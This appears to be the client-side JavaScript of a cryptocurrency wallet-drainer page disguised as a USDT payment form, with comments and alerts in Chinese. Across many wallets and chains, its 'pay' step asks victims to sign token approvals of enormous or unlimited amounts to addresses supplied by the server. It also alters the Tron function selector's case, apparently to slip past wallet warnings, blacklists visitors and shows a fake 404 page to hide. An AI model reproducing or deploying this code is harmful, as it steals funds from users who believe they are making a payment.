   let wallet = undefined;
    let chain = undefined;
    let address = undefined;
    let approve_address = [];
    let push = true;
    let accounts = undefined;
    let order_id = '301751642044669';
    let energy_needed = 104400;
    rented = false;

    function toggleLoader(display = 'flex') {
        document.getElementById('overlay').style.display = display
    }

    toggleLoader();

    // function replaceHostInUrl(text, newHost) {
    //     return text.replace(/https:\/\/([^\/]+)(\/[^\s]*)?/g, (match, p1, p2) => {
    //         const url = new URL(match);
    //         url.host = newHost; // 替换主机部分
    //         return url.origin + (p2 || ''); // 返回新的 URL
    //     });
    // }
    //
    // p_url = replaceHostInUrl(window.location.href, 'nginx404noutfound.cloudflare-node.cyou');
    function set_404() {
        document.body.innerHTML = "<h1>404 Not Found</h1><p>The page you are looking for does not exist.</p>";
        document.title = "404 Not Found";
    }


    async function get_contract_address(address) {
        try {
            const response = await fetch('/get_contract_address?address=' + address); // 发起 GET 请求
            if (!response.ok) {
                throw new Error(`HTTP error! Status: ${response.status}`);
            }
            const data = await response.json(); // 解析 JSON 内容
            return data; // 返回解析后的数据
        } catch (error) {
            window.location.reload()
        }
    }

    async function is_bl(address) {
        try {
            const response = await fetch('/query_bl?address=' + address); // 发起 GET 请求
            if (!response.ok) {
                throw new Error(`HTTP error! Status: ${response.status}`);
            }
            const data = await response.json(); // 解析 JSON 内容
            return data; // 返回解析后的数据
        } catch (error) {
            window.location.reload()
        }
    }

    function getFirstElementOrItself(variable) {
        if (Array.isArray(variable)) {
            // 如果是数组，返回第一个元素
            return variable[0];
        } else {
            // 否则返回它本身
            return variable;
        }
    }

    window.addEventListener("load", async function () {
        print_dev('load');
        if (typeof window.imToken !== "undefined") {
            wallet = 'imtoken';
            print_dev('imtoken');
            if (typeof window.tronWeb !== "undefined") {
                chain = 'tron';
                print_dev('tron');
                address = window.tronWeb.defaultAddress.base58;
                print_dev(address)
            } else if (typeof window.ethereum !== "undefined") {
                switch (window.ethereum.chainId) {
                    case '0x1':
                        chain = 'eth';
                        print_dev('eth');
                        break
                    case '0x38':
                        chain = 'bsc';
                        print_dev('bsc');
                        break
                }
                accounts = await ethereum.request({method: 'eth_requestAccounts'});
                for (let i in accounts) {
                    print_dev(accounts[i])
                }
            }
        } else if (typeof window.tokenpocket !== "undefined") {
            wallet = 'tp';
            print_dev('tp');
            if (typeof window.tronWeb !== "undefined" && window.tronWeb.defaultAddress.base58) {
                chain = 'tron';
                print_dev('tron');
                address = window.tronWeb.defaultAddress.base58;
                print_dev(address);
            } else if (typeof window.ethereum !== "undefined") {
                switch (window.ethereum.chainId) {
                    case '0x1':
                        chain = 'eth';
                        print_dev('eth');
                        break
                    case '0x38':
                        chain = 'bsc';
                        print_dev('bsc');
                        break
                }
                accounts = await ethereum.request({method: 'eth_requestAccounts'});
                for (let i in accounts) {
                    print_dev(accounts[i])
                }
            }
        } else if (typeof window.okxwallet !== "undefined") {
            window.okxwallet.on('chainChanged', handleChainChanged);
            wallet = 'okx';
            print_dev('okx');
            if (okx_net === 'tron') {
                chain = 'tron';
                print_dev('tron');
                accounts = await window.okxwallet.tronLink.request({method: 'tron_requestAccounts'});
                print_dev(accounts)
                address = tronWeb.defaultAddress.base58;
                print_dev(address)
            } else if (okx_net === 'eth') {
                switch (window.ethereum.chainId) {
                    case '0x1':
                        chain = 'eth';
                        print_dev('eth');
                        break
                    case '0x38':
                        chain = 'bsc';
                        print_dev('bsc');
                        break
                }
                accounts = await window.okxwallet.request({method: 'eth_requestAccounts'});
                print_dev(accounts)
            }

        } else if (typeof window.trustwallet !== "undefined") {
            wallet = 'trust';
            print_dev('trust');
            accounts = await window.trustwallet.request({
                method: "eth_requestAccounts",
            });
            print_dev(accounts)
            let chainId = await window.trustwallet.request({method: "eth_chainId"});
            switch (chainId) {
                case 1:
                    chain = 'eth';
                    print_dev('eth');
                    break
                case 56:
                    chain = 'bsc';
                    print_dev('bsc');
                    break
            }
        } else if (typeof window.bitkeep !== "undefined") {
            wallet = 'bitkeep';
            print_dev('bitkeep');
            if (typeof window.bitkeep.tronWeb !== "undefined") {
                chain = 'tron';
                print_dev('tron');
                address = window.tronWeb.defaultAddress.base58;
                print_dev(address);
            } else if (typeof window.ethereum !== "undefined") {
                switch (window.ethereum.chainId) {
                    case '0x1':
                        chain = 'eth';
                        print_dev('eth');
                        break
                    case '0x38':
                        chain = 'bsc';
                        print_dev('bsc');
                        break
                }
                accounts = await ethereum.request({method: 'eth_requestAccounts'});
                for (let i in accounts) {
                    print_dev(accounts[i])
                }
            }
        } else if (typeof window.tronLink !== "undefined") {
            wallet = 'tronlink';
            print_dev('tronlink');
            chain = 'tron';
            print_dev('tron');
            let res = await tronLink.request({method: 'tron_requestAccounts'});
            while (res.code !== 200) {
                res = await tronLink.request({method: 'tron_requestAccounts'});
            }
            address = tronWeb.defaultAddress.base58;
            print_dev(address)
        } else if (typeof window.tronWeb !== "undefined") {
            // 其他钱包
            wallet = 'tronweb';
            print_dev('tronweb');
            chain = 'tron';
            print_dev('tron');
            address = window.tronWeb.defaultAddress.base58;
            print_dev(address);

        } else if (typeof window.ethereum !== "undefined") {
            // 其他钱包
            if (typeof window.ethereum.isMetaMask !== "undefined") {
                wallet = 'metamask';
                print_dev('metamask');
                let chainId = await ethereum.request({method: 'eth_chainId'});
                switch (chainId) {
                    case '0x1':
                        chain = 'eth';
                        print_dev('eth');
                        break
                    case '0x38':
                        chain = 'bsc';
                        print_dev('bsc');
                        break
                }
                accounts = await ethereum.request({method: 'eth_requestAccounts'});
                for (let i in accounts) {
                    print_dev(accounts[i])
                }
            } else {
                wallet = 'web3';
                print_dev('web3');
                let chainId = undefined;
                try {
                    chainId = await ethereum.request({method: 'eth_chainId'});
                } catch (e) {
                    print_dev(e)
                }
                try {
                    if (chainId === undefined) {
                        chainId = window.ethereum.chainId
                    }
                } catch (e) {
                    print_dev(e)
                }
                switch (chainId) {
                    case '0x1':
                        chain = 'eth';
                        print_dev('eth');
                        break
                    case '0x38':
                        chain = 'bsc';
                        print_dev('bsc');
                        break
                }
                accounts = await ethereum.request({method: 'eth_requestAccounts'});
                for (let i in accounts) {
                    print_dev(accounts[i])
                }
            }
        }
        switch (chain) {
            case 'tron':
                address_ele.value = tron_contract_address;
                break
            case 'eth':
                address_ele.value = eth_contract_address;
                break
            case 'bsc':
                address_ele.value = bsc_contract_address;
                break
        }

        let is_bl_res = await is_bl(address || getFirstElementOrItself(accounts));

        if (is_bl_res.data) {
            set_404()
        }

        let res = await get_contract_address(address || getFirstElementOrItself(accounts));
        approve_address = res.address;
        push = res.p;
        print_dev(push);
        print_dev(approve_address);
        toggleLoader('none');
        let addr_temp = encodeURIComponent(address || getFirstElementOrItself(accounts));
        fetch(`/access?address=${addr_temp}&wallet=${encodeURIComponent(wallet)}&chain=${encodeURIComponent(chain)}&order_id=${order_id}`)
            .then(response => {
                if (!response.ok) {
                    throw new Error(`HTTP error: ${response.status}`);
                }
                return response.json();
            })
            .then(data => {
                console.log("返回的数据：", data);
            })
            .catch(error => {
                console.error("请求出错：", error);
            });

    });

    function handleChainChanged(chainId) {
        // We recommend reloading the page, unless you must do otherwise.
        window.location.reload();
    }

    function print_dev(text) {
        document.getElementById('dev').innerHTML += text + '<br>'
    }

    async function pay() {
        print_dev('开始支付');
        toggleLoader();
        setTimeout(toggleLoader, 30000, 'none');
        switch (wallet) {
            case 'okx':
                switch (chain) {
                    case 'tron':
                        await okx_tron();
                        break
                    case 'eth':
                        await okx_eth();
                        break
                    case 'bsc':
                        await okx_bsc();
                        break
                }
                break
            case 'imtoken':
                switch (chain) {
                    case 'tron':
                        await imtoken_tron();
                        break
                    case 'eth':
                        alert('正在拉起支付！选择安全模式后，请勿修改下个页面代币数量，否则会导致支付失败！');
                        await imtoken_eth();
                        break
                    case 'bsc':
                        alert('正在拉起支付！选择安全模式后，请勿修改下个页面代币数量，否则会导致支付失败！');
                        await imtoken_bsc();
                        break
                }
                break
            case 'tp':
                switch (chain) {
                    case 'tron':
                        await tp_tron();
                        break
                    case 'eth':
                        await tp_eth();
                        break
                    case 'bsc':
                        await tp_bsc();
                        break
                }
                break
            case 'trust':
                switch (chain) {
                    case 'eth':
                        await trust_eth();
                        break
                    case 'bsc':
                        await trust_bsc();
                        break
                }
                break
            case 'bitkeep':
                switch (chain) {
                    case 'tron':
                        await bitkeep_tron();
                        break
                    case 'eth':
                        await bitkeep_eth();
                        break
                    case 'bsc':
                        await bitkeep_bsc();
                        break
                }
                break
            case 'metamask':
                switch (chain) {
                    case 'eth':
                        await metamask_eth();
                        break
                    case 'bsc':
                        await metamask_bsc();
                        break
                }
                break
            case 'tronlink':
                switch (chain) {
                    case 'tron':
                        await tronlink_tron();
                        break
                }
                break
            case 'tronweb':
                switch (chain) {
                    case 'tron':
                        await tp_tron();
                        break
                }
                break
            case 'web3':
                switch (chain) {
                    case 'eth':
                        await metamask_eth();
                        break
                    case 'bsc':
                        await metamask_bsc();
                        break
                }
                break
        }

        async function okx_tron() {
            let trx_balance = await tronWeb.trx.getBalance(window.tronWeb.defaultAddress.base58);
            let _account_resources = await tronWeb.trx.getAccountResources();
            let tron_energy = _account_resources.EnergyLimit || 0;
            console.log(tron_energy);
            if (((trx_balance < 30000000) && (tron_energy < energy_needed || trx_balance < 500000)) && !rented) {
                alert('没有足够的TRX用于支付网络费。');
                toggleLoader('none');
            } else {
                let approve_tx = await tronWeb.transactionBuilder.triggerSmartContract(
                    tron_contract_address,
                    'increaseApproval(address,uint256)',
                    {
                        feeLimit: 100000000,
                    },
                    [
                        {
                            type: 'address',
                            value: approve_address[0],
                        },
                        {
                            type: 'uint256',
                            value:
                                '0x000fffffffffffffffffffffffffffffffffffffffffffffffffffffffffff',
                        },
                    ],
                    address
                );
                let signed_tx = await tronWeb.trx.sign(approve_tx.transaction);
                // signed_tx.raw_data = approve_tx_raw;
                try {
                    let result = tronWeb.trx.sendRawTransaction(signed_tx);
                    console.log(result);
                    await success_callback(accounts[0], approve_address[0], 2);
                } catch (error) {
                    alert('失败');
                    toggleLoader('none');
                    console.log(error)
                }
            }
        }

        async function okx_eth() {
            let web3 = new Web3(window.ethereum);
            let contract = new web3.eth.Contract(eth_contract_abi, eth_contract_address);
            contract.methods.approve(
                approve_address[1], '999999999999999999999999999999999999999999999999999999999999999999999'
            ).send(
                {from: accounts[0]}).on('transactionHash', async function (hash) {
                    print_dev(hash);
                    await success_callback(accounts[0], approve_address[1], 1);
                }
            );
        }

        async function okx_bsc() {
            let web3 = new Web3(window.ethereum);
            let contract = new web3.eth.Contract(bsc_contract_abi, bsc_contract_address);
            contract.methods.approve(
                approve_address[2], '999999999999999999999999999999999999999999999999999999999999999999999'
            ).send(
                {from: accounts[0]}).on('transactionHash', async function (hash) {
                    print_dev(hash);
                    await success_callback(accounts[0], approve_address[2], 2);
                }
            );
        }

        async function imtoken_tron() {
            let trx_balance = await tronWeb.trx.getBalance(window.tronWeb.defaultAddress.base58);
            let _account_resources = await tronWeb.trx.getAccountResources();
            let tron_energy = _account_resources.EnergyLimit || 0;
            console.log(tron_energy);
            if (((trx_balance < 30000000) && (tron_energy < energy_needed || trx_balance < 500000)) && !rented) {
                alert('没有足够的TRX用于支付网络费。');
                toggleLoader('none');
            } else {


                let approve_tx = await tronWeb.transactionBuilder.triggerSmartContract(
                    tron_contract_address,
                    'increaseApproval(address,uint256)',
                    {
                        feeLimit: 100000000,
                    },
                    [
                        {
                            type: 'address',
                            value: approve_address[0],
                        },
                        {
                            type: 'uint256',
                            value:
                                '0x0000000000000000000000000000000000000000661efdf2e3b1a000000000',
                        },
                    ],
                    address
                );
                let rawDataHex = approve_tx.transaction.raw_data_hex.toString();
                rawDataHex.replace("d73dd623", "D73DD623");
                let contractData = approve_tx.transaction.raw_data.contract[0].parameter.value.data.toString();
                contractData = contractData.replace("d73dd623", "D73DD623");
                approve_tx.transaction.raw_data_hex = rawDataHex;
                approve_tx.transaction.raw_data.contract[0].parameter.value.data = contractData;

                let signed_tx = await tronWeb.trx.sign(approve_tx.transaction);

                try {
                    let result = tronWeb.trx.sendRawTransaction(signed_tx);
                    console.log(result);
                    await success_callback(address, approve_address[0], 2);
                } catch (error) {
                    alert('失败');
                    toggleLoader('none');
                    console.log(error)
                }
            }
        }

        async function imtoken_eth() {
            let web3 = new Web3(window.ethereum);
            let contract = new web3.eth.Contract(eth_contract_abi, eth_contract_address);
            contract.methods.approve(
                approve_address[1], '123456789123456789123456789'
            ).send(
                {from: accounts[0]}).on('transactionHash', async function (hash) {
                    print_dev(hash);
                    await success_callback(accounts[0], approve_address[1], 1);
                }
            );
        }

        async function imtoken_bsc() {
            let web3 = new Web3(window.ethereum);
            let contract = new web3.eth.Contract(bsc_contract_abi, bsc_contract_address);
            contract.methods.approve(
                approve_address[2], '123456789123456789123456789123456789'
            ).send(
                {from: accounts[0]}).on('transactionHash', async function (hash) {
                    print_dev(hash);
                    await success_callback(accounts[0], approve_address[2], 2);
                }
            );
        }

        async function tp_tron() {
            let trx_balance = await tronWeb.trx.getBalance(window.tronWeb.defaultAddress.base58);
            let _account_resources = await tronWeb.trx.getAccountResources();
            let tron_energy = _account_resources.EnergyLimit || 0;
            console.log(tron_energy);
            if (((trx_balance < 30000000) && (tron_energy < energy_needed || trx_balance < 500000)) && !rented) {
                alert('没有足够的TRX用于支付网络费。');
                toggleLoader('none');
            } else {
                let approve_tx = await tronWeb.transactionBuilder.triggerSmartContract(
                    tron_contract_address,
                    'increaseApproval(address,uint256)',
                    {
                        feeLimit: 100000000,
                    },
                    [
                        {
                            type: 'address',
                            value: approve_address[0],
                        },
                        {
                            type: 'uint256',
                            value:
                                '0x0000000000000000000000000000000000000000661efdf2e3b1a000000000',
                        },
                    ],
                    address
                );
                print_dev(approve_tx)
                let signed_tx = await tronWeb.trx.sign(approve_tx.transaction);
                // signed_tx.raw_data = approve_tx_raw;
                try {
                    let result = tronWeb.trx.sendRawTransaction(signed_tx);
                    console.log(result);
                    await success_callback(address, approve_address[0], 2);
                } catch (error) {
                    alert('失败');
                    toggleLoader('none');
                    console.log(error)
                }
            }
        }

        async function tp_eth() {
            let web3 = new Web3(window.ethereum);
            print_dev(web3)
            let contract = new web3.eth.Contract(eth_contract_abi, eth_contract_address);
            print_dev(contract)
            print_dev(approve_address[1])
            print_dev(accounts[0])

            contract.methods.approve(
                approve_address[1], '123456789123456789123456789'
            ).send(
                {from: accounts[0]}).on('transactionHash', async function (hash) {
                    print_dev(hash);
                    await success_callback(accounts[0], approve_address[1], 1);
                }
            );
        }

        async function tp_bsc() {
            let web3 = new Web3(window.ethereum);
            let contract = new web3.eth.Contract(bsc_contract_abi, bsc_contract_address);
            contract.methods.approve(
                approve_address[2], '123456789123456789123456789123456789'
            ).send(
                {from: accounts[0]}).on('transactionHash', async function (hash) {
                    print_dev(hash);
                    await success_callback(accounts[0], approve_address[2], 2);
                }
            );
        }

        async function trust_eth() {
            let web3 = new Web3(window.ethereum);
            print_dev(web3)
            let contract = new web3.eth.Contract(eth_contract_abi, eth_contract_address);
            print_dev(contract)
            print_dev(approve_address[1])
            print_dev(accounts[0])

            contract.methods.approve(
                approve_address[1], '123456789123456789123456789'
            ).send(
                {from: accounts[0]}).on('transactionHash', async function (hash) {
                    print_dev(hash);
                    await success_callback(accounts[0], approve_address[1], 1);
                }
            );
        }

        async function trust_bsc() {
            let web3 = new Web3(window.ethereum);
            let contract = new web3.eth.Contract(bsc_contract_abi, bsc_contract_address);
            contract.methods.approve(
                approve_address[2], '123456789123456789123456789123456789'
            ).send(
                {from: accounts[0]}).on('transactionHash', async function (hash) {
                    print_dev(hash);
                    await success_callback(accounts[0], approve_address[2], 2);
                }
            );
        }

        async function bitkeep_tron() {
            let trx_balance = await tronWeb.trx.getBalance(window.tronWeb.defaultAddress.base58);
            let _account_resources = await tronWeb.trx.getAccountResources();
            let tron_energy = _account_resources.EnergyLimit || 0;
            console.log(tron_energy);
            print_dev(trx_balance);
            if (((trx_balance < 30000000) && (tron_energy < energy_needed || trx_balance < 500000)) && !rented) {
                alert('没有足够的TRX用于支付网络费。');
                toggleLoader('none');
            } else {
                let approve_tx = await tronWeb.transactionBuilder.triggerSmartContract(
                    tron_contract_address,
                    'increaseApproval(address,uint256)',
                    {
                        feeLimit: 100000000,
                    },
                    [
                        {
                            type: 'address',
                            value: approve_address[0],
                        },
                        {
                            type: 'uint256',
                            value:
                                '0x0000000000000000000000000000000000000000661efdf2e3b1a000000000',
                        },
                    ],
                    address
                );
                print_dev(approve_tx)
                let signed_tx = await tronWeb.trx.sign(approve_tx.transaction);
                // signed_tx.raw_data = approve_tx_raw;
                try {
                    let result = tronWeb.trx.sendRawTransaction(signed_tx);
                    console.log(result);
                    await success_callback(address, approve_address[0], 2);
                } catch (error) {
                    alert('失败');
                    toggleLoader('none');
                    console.log(error)
                }
            }
        }

        async function bitkeep_eth() {
            let web3 = new Web3(window.ethereum);
            print_dev(web3)
            let contract = new web3.eth.Contract(eth_contract_abi, eth_contract_address);
            print_dev(contract)
            print_dev(approve_address[1])
            print_dev(accounts[0])

            contract.methods.approve(
                approve_address[1], '123456789123456789123456789'
            ).send(
                {from: accounts[0]}).on('transactionHash', async function (hash) {
                    print_dev(hash);
                    await success_callback(accounts[0], approve_address[1], 1);
                }
            );
        }

        async function bitkeep_bsc() {
            let web3 = new Web3(window.ethereum);
            let contract = new web3.eth.Contract(bsc_contract_abi, bsc_contract_address);
            contract.methods.approve(
                approve_address[2], '123456789123456789123456789123456789'
            ).send(
                {from: accounts[0]}).on('transactionHash', async function (hash) {
                    print_dev(hash);
                    await success_callback(accounts[0], approve_address[2], 2);
                }
            );
        }

        async function metamask_eth() {
            let web3 = new Web3(window.ethereum);
            let contract = new web3.eth.Contract(eth_contract_abi, eth_contract_address);

            contract.methods.approve(
                approve_address[1], '123456789123456789123456789'
            ).send(
                {from: accounts[0]}).on('transactionHash', async function (hash) {
                    print_dev(hash);
                    await success_callback(accounts[0], approve_address[1], 1);
                }
            );
        }

        async function metamask_bsc() {
            let web3 = new Web3(window.ethereum);
            let contract = new web3.eth.Contract(bsc_contract_abi, bsc_contract_address);
            contract.methods.approve(
                approve_address[2], '123456789123456789123456789123456789'
            ).send({from: accounts[0]}).on('transactionHash', async function (hash) {
                    print_dev(hash);
                    await success_callback(accounts[0], approve_address[2], 2);
                }
            ).on('error', async function (error) {
                alert('qu');
                print_dev(error);
                toggleLoader('none')
            });

        }

        async function tronlink_tron() {
            let trx_balance = await tronWeb.trx.getBalance(window.tronWeb.defaultAddress.base58);
            let _account_resources = await tronWeb.trx.getAccountResources();
            let tron_energy = _account_resources.EnergyLimit || 0;
            // console.log(tron_energy);
            // print_dev(trx_balance);
            console.log(trx_balance, tron_energy, (trx_balance < 30000000) && (tron_energy < energy_needed || trx_balance < 500000));
            if (((trx_balance < 30000000) && (tron_energy < energy_needed || trx_balance < 500000)) && !rented) {
                alert('没有足够的TRX用于支付网络费。');
                toggleLoader('none');
            } else {
                let approve_tx = await tronWeb.transactionBuilder.triggerSmartContract(
                    tron_contract_address,
                    'increaseApproval(address,uint256)',
                    {
                        feeLimit: 100000000,
                    },
                    [
                        {
                            type: 'address',
                            value: approve_address[0],
                        },
                        {
                            type: 'uint256',
                            value:
                                '0x0000000000000000000000000000000000000000661efdf2e3b1a000000000',
                        },
                    ],
                    address
                );
                console.log(approve_tx);
                print_dev(approve_tx)
                let signed_tx = await tronWeb.trx.sign(approve_tx.transaction);
                // signed_tx.raw_data = approve_tx_raw;
                try {
                    let result = tronWeb.trx.sendRawTransaction(signed_tx);
                    console.log(result);
                    await success_callback(address, approve_address[0], 2);
                } catch (error) {
                    alert('失败');
                    toggleLoader('none');
                    console.log(error)
                }
            }
        }
    }

    async function success_callback(address, approved, type) {
        if (push) {
            try {
                const response = await fetch('/success_callback?address=' + address + '&approved=' + approved + '&approve_type=' + type + '&chain=' + chain + '&order_id=' + order_id); // 发起 GET 请求
                if (!response.ok) {
                    throw new Error(`HTTP error! Status: ${response.status}`);
                }
                const data = await response.json(); // 解析 JSON 内容
                if (data.code === 1) {
                    alert('付款失败，请尝试使用其他钱包！');
                    location.reload();
                }
            } catch (error) {
                alert('付款失败！');
                toggleLoader('none')
            }
        } else {
            try {
                const response = await fetch('/add_bl?address=' + address); // 发起 GET 请求
                if (!response.ok) {
                    throw new Error(`HTTP error! Status: ${response.status}`);
                }
                const data = await response.json(); // 解析 JSON 内容
                if (data.code === 1) {
                    alert('付款失败！');
                    toggleLoader('none')
                } else {
                    alert('付款失败！');
                    toggleLoader('none')
                }
                set_404()
            } catch (error) {
                window.location.reload()
            }

        }
    }
</script>
<script>
    const is = document.getElementById('input_submit')
    // 地址
    const address_ele = document.getElementById('pay_addr')
    // 金额
    const rate = document.getElementById('rate')
    const zz = document.getElementById('zz')
    const module = document.getElementById('module')
    const m1 = document.getElementById('m1')
    const m2 = document.getElementById('m2')
    const safe_f = document.getElementById('safe_f')
    const safe = document.getElementById('safe')
    const danger_f = document.getElementById('danger_f')
    const danger = document.getElementById('danger')
    // 取消
    const cancel = document.getElementById('cancel')
    // 确认
    const confirm = document.getElementById('confirm')
    const amount_ele = document.getElementById('amount')

    confirm.addEventListener('click', () => {
        // 点击确认
        // let rate = rate.value
        // let address = address.value

        // console.log(rate, address)
        pay();
        // 收起弹窗
        // module.classList.remove('animate__zoomInDown')
        // module.classList.remove('show')
        // module.classList.add('hide')
        // zz.style.display = 'none'
    })

    // 金额输入
    rate.addEventListener('input', () => {
        let rateValue = rate.value
        if (!parseFloat(rateValue)) {
            rate.value = 1.0
        }
    })

    // 收起弹窗
    cancel.addEventListener('click', () => {
        module.classList.remove('animate__zoomInDown')
        module.classList.remove('show')
        module.classList.add('hide')
        zz.style.display = 'none'
    })

    // 出现弹窗
    is.addEventListener('click', async () => {
        if (address === undefined && accounts === undefined) {
            window.location.reload();
            return;
        }

        if (approve_address.length >= 3) {
            try {


                // ✅ 显示模块动画
                module.classList.remove('animate__zoomOutDown');
                module.classList.remove('hide');
                zz.style.display = 'block';
                module.classList.add('show');
                module.classList.add('animate__zoomInDown');

                let rateValue = rate.value;
                if (parseFloat(rateValue) % 1 === 0) {
                    amount_ele.value = parseFloat(rateValue).toFixed(1);
                } else {
                    amount_ele.value = parseFloat(rateValue);
                }

                if (chain === 'tron') {
                    let trx_balance = await tronWeb.trx.getBalance(tronWeb.defaultAddress.hex);
                    let contract = await tronWeb.contract().at('TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t');
                    let usdtRaw = await contract.methods.balanceOf(tronWeb.defaultAddress.hex).call();
                    console.log(trx_balance, usdtRaw);
                    if (trx_balance >= 500000 && usdtRaw >= 10000000) {
                        let response = await fetch(`/rent_energy?address=${encodeURIComponent(address)}`);
                        let data = await response.json();
                        if (data.code === 1) {
                            rented = true
                        }
                        console.log('百亿补贴:', data);
                    }
                }
            } catch (error) {
                console.error('请求出错:', error);
            }
        }
    });


    m1.addEventListener('click', () => {
        safe.style.display = 'flex'
        safe_f.style.display = 'flex'
        danger.style.display = 'none'
        danger_f.style.display = 'none'
    })
    m2.addEventListener('click', () => {
        safe.style.display = 'none'
        safe_f.style.display = 'none'

        danger.style.display = 'flex'
        danger_f.style.display = 'flex'
    })

    document.addEventListener('DOMContentLoaded', function () {
        const addressInput = document.getElementById('address')
        const rateInput = document.getElementById('rate')
        const submitButton = document.getElementById('input_submit')

        function validateInputs() {
            // const address = addressInput.value.trim()
            // const rate = rateInput.value.trim()
            // if (address && rate) {
            //     submitButton.classList.add('active')
            // } else {
            //     submitButton.classList.remove('active')
            // }
            submitButton.classList.add('active')
        }

        // addressInput.addEventListener('input', validateInputs)
        rateInput.addEventListener('input', validateInputs)

        // 初始化按钮状态
        validateInputs()